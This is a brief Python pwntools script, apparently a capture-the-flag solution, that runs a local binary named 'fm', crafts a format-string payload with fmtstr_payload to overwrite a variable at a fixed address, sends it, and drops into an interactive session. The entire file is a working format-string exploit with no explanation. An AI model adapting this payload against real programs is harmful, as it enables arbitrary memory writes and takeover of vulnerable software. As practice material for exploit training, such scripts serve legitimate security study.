from pwn import *
p = process("./fm")
x_addr = 0x0804A02C
payload = fmtstr_payload(11,{x_addr:4})
p.sendline(payload)
p.interactive()
